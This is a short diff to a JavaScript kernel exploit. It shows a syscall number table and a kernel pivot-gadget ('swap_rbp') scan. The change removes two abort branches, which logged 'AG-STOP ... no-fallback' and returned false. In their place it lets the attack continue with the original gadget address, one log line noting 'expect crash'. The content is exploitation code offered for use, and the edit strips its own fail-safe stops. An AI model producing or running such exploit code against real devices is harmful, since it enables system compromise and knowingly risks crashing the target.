@@ -33,7 +33,7 @@
     A way to call native code is NOT needed.
 */
 
-import { int64 } from "./int64.js?v=0411";
+import { int64 } from "./int64.js";
 
 const S = {
   read: 3, open: 5, close: 6, ioctl: 54, mprotect: 74, socket: 97, setsockopt: 105,
@@ -2092,12 +2092,10 @@ async function attempt(ctx, opts) {
             + (delta !== 0 ? (" (shifted " + delta + ")") : " (same)"));
         K.swap_rbp = realRVA;
       } else {
-        say("AG-STOP code=KERNEL-PIVOT-GADGET-NOT-FOUND detail=4e95c3-missing; no-fallback");
-        return false;
+        say("[1b] swap_rbp 4e95c3 not in window -- using original, expect crash");
       }
     } else {
-      say("AG-STOP code=KERNEL-PIVOT-SCAN-FAILED detail=unreliable-read; no-fallback");
-      return false;
+      say("[1b] scan shot missed -- using original K.swap_rbp");
     }
   }
 
